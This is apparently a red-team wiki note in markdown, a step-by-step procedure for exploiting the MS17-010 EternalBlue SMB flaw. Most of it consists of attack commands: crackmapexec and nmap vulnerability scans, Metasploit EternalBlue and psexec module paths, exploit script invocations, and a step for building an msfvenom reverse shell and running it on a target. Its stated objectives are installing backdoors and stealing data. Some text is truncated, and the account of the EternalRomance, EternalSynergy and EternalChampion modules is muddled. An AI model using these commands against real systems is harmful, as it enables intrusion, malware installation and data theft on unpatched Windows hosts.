---
id: 16df1b22-d7a7-4d97-9d3c-da28ee6479c9
name: Eternal Blue Exploitation
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:30.541615+00:00'
updated_at: '2023-04-10T20:37:48.194856+00:00'
tactics:
- '[[Initial Access|TA0001 - Initial Access]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Exploitation for Privilege Escalation|T1068 - Exploitation for Privilege Escalation]]'
- '[[Exploit Public-Facing Application|T1190 - Exploit Public-Facing Application]]'
tags:
- '[[EoP - Common Vulnerabilities and Exposure]]'
- '[[MS17-010 (Eternal Blue)]]'
- '[[Windows - Privilege Escalation]]'
commands:
- '[[Checking system architecture]]'
- '[[crackmapexec smb with ms17-010 exploit against 10.10.10.10]]'
- '[[Exploiting target]]'
- '[[MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption]]'
- '[[MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+]]'
- '[[MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code
  Execution]]'
- '[[MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command
  Execution]]'
- '[[MS17-010 SMB RCE Detection]]'
- '[[Scanning target]]'
- '[[SMB Vulnerability Scan]]'
---

# Eternal Blue Exploitation

## Summary

Eternal Blue is an exploit that targets Microsoft Windows SMB protocol. The exploit allows an attacker to execute arbitrary code on the target system with SYSTEM privileges. This can lead to complete compromise of the target system. The exploit was leaked by the Shadow Brokers group in 2017 and was

## Description

# Description

Eternal Blue is an exploit that targets Microsoft Windows SMB protocol. The exploit allows an attacker to execute arbitrary code on the target system with SYSTEM privileges. This can lead to complete compromise of the target system. The exploit was leaked by the Shadow Brokers group in 2017 and was used in the WannaCry ransomware attack. Eternal Blue is still a widely used exploit by attackers. 

Technical explanation: The exploit targets a vulnerability in the SMB protocol, specifically a buffer overflow in the handling of SMBv1 packets. The exploit sends a specially crafted packet to the target system, which triggers the buffer overflow and allows the attacker to execute arbitrary code with SYSTEM privileges. 

Business value: Eternal Blue can be used by attackers to gain access to sensitive data, install malware, and take control of the target system. This can lead to significant financial losses, reputational damage, and legal liabilities for the victim organization.

## Requirements

1. Access to the target system's network

1. Knowledge of the target system's vulnerabilities

1. A tool capable of exploiting the MS17-010 vulnerability

## Defense

1. Apply the latest security patches and updates to the target system

1. Disable SMBv1 protocol on the target system

1. Implement network segmentation to limit the impact of a successful attack

## Objectives

1. Gain SYSTEM-level access on the target system

1. Install malware or backdoors on the target system

1. Steal sensitive data from the target system

# Instructions

1. Execute the above command to check if the target system is vulnerable to MS17-010 exploit.

**Code**: [[crackmapexec smb 10.10.10.10 -u '' -p '' -d domain]]

> The 'crackmapexec' command is used to check for the MS17-010 vulnerability on the target system. The '-u' and '-p' options are used to provide the username and password for authentication. The '-d' option is used to specify the domain of the target system. The '-M' option is used to specify the module to be used for checking the vulnerability. In this case, the 'ms17-010' module is used to check for the vulnerability. If the target system is vulnerable, the command will return the details of the vulnerability.

**Command** ([[crackmapexec smb with ms17-010 exploit against 10.10.10.10]]):

```bash
crackmapexec smb 10.10.10.10 -u '' -p '' -d domain -M ms17-010
```

2. This command is used to scan for SMB vulnerabilities in a network. The command uses Nmap to scan for open ports on the specified IP netblock and checks for the SMB vulnerability ms17-010. The argument <ip_netblock> should be replaced with the IP address range to be scanned.

**Code**: [[nmap -Pn -p445 --open --max-hostgroup 3 --script s]]

> The command uses the following arguments:
-Pn: Treat all hosts as online (skip host discovery)
-p445: Scan for open port 445 (SMB)
--open: Only show open ports
--max-hostgroup 3: Limit the number of hosts scanned in parallel to 3
--script smb-vuln-ms17–010: Run the Nmap script to check for the SMB vulnerability ms17-010

**Command** ([[SMB Vulnerability Scan]]):

```bash
nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17–010 <ip_netblock>
```

3. Use these Metasploit modules to exploit the EternalBlue vulnerability in Windows systems. The vulnerability allows remote code execution and can be used to gain access to sensitive data.

**Code**: [[EternalRomance/EternalSynergy/EternalChampion]]

> The EternalBlue vulnerability is a critical vulnerability in the Windows operating system that was exploited by the WannaCry ransomware attack in 2017. These Metasploit modules provide a way to exploit the vulnerability and gain access to vulnerable systems. The EternalRomance module targets Windows 7 and Windows 2008 systems, while the EternalSynergy module targets Windows 8 and Windows 2012 systems. The EternalChampion module is a combination of the EternalRomance and EternalSynergy modules and targets a wider range of systems.

**Command** ([[Checking system architecture]]):

```bash
python eternal_checker.py
```

**Command** ([[Scanning target]]):

```bash
python eternal_scanner.py -t 192.168.1.1/24
```

**Command** ([[Exploiting target]]):

```bash
python eternal_exploit.py -t 192.168.1.2 -m eternalblue -p 445
```

4. This command provides details for multiple commands related to MS17-010 vulnerability in SMB protocol. The commands are:
1. auxiliary/admin/smb/ms17_010_command: This command is used for SMB Remote Windows Command Execution using EternalRomance/EternalSynergy/EternalChampion exploit.
2. auxiliary/scanner/smb/smb_ms17_010: This command is used for SMB RCE Detection.
3. exploit/windows/smb/ms17_010_eternalblue: This command is used for SMB Remote Windows Kernel Pool Corruption using EternalBlue exploit.
4. exploit/windows/smb/ms17_010_eternalblue_win8: This command is used for SMB Remote Windows Kernel Pool Corruption using EternalBlue exploit for Windows 8 and above.
5. exploit/windows/smb/ms17_010_psexec: This command is used for SMB Remote Windows Code Execution using EternalRomance/EternalSynergy/EternalChampion exploit.

**Code**: [[auxiliary/admin/smb/ms17_010_command          MS17]]

> The MS17-010 vulnerability in SMB protocol allows an attacker to execute arbitrary code on a remote system. The vulnerability affects various versions of Windows operating systems. The commands provided in this JSON object can be used to exploit this vulnerability for various purposes such as command execution, kernel pool corruption, and code execution. It is important to note that these commands should only be used for ethical and legitimate purposes with appropriate permissions and authorizations.

**Command** ([[MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution]]):

```bash
auxiliary/admin/smb/ms17_010_command
```

**Command** ([[MS17-010 SMB RCE Detection]]):

```bash
auxiliary/scanner/smb/smb_ms17_010
```

**Command** ([[MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption]]):

```bash
exploit/windows/smb/ms17_010_eternalblue
```

**Command** ([[MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+]]):

```bash
exploit/windows/smb/ms17_010_eternalblue_win8
```

**Command** ([[MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution]]):

```bash
exploit/windows/smb/ms17_010_psexec
```

5. To use this command, first clone the MS17-010 repository using the git clone command. After cloning the repository, generate a simple reverse shell using the msfvenom command with the specified LHOST and LPORT values. Finally, send and execute the reverse shell using the send_and_execute.py script with the IP address of the target machine and the name of the reverse shell executable.

**Code**: [[git clone https://github.com/helviojunior/MS17-010]]

> This command allows you to clone the MS17-010 repository and generate a reverse shell executable that can be used to gain access to a target machine. The msfvenom command generates a payload that will connect back to the specified IP address and port. The send_and_execute.py script sends the reverse shell executable to the target machine and executes it, allowing the attacker to gain remote access to the machine. This command is useful when Metasploit cannot be used or when a reverse shell is preferred over a Meterpreter session.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access|TA0001 - Initial Access]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Exploitation for Privilege Escalation|T1068 - Exploitation for Privilege Escalation]]
- [[Exploit Public-Facing Application|T1190 - Exploit Public-Facing Application]]

## Commands Used

- [[Checking system architecture]]
- [[crackmapexec smb with ms17-010 exploit against 10.10.10.10]]
- [[Exploiting target]]
- [[MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption]]
- [[MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+]]
- [[MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution]]
- [[MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution]]
- [[MS17-010 SMB RCE Detection]]
- [[Scanning target]]
- [[SMB Vulnerability Scan]]

## Tags

- [[EoP - Common Vulnerabilities and Exposure]]
- [[MS17-010 (Eternal Blue)]]
- [[Windows - Privilege Escalation]]
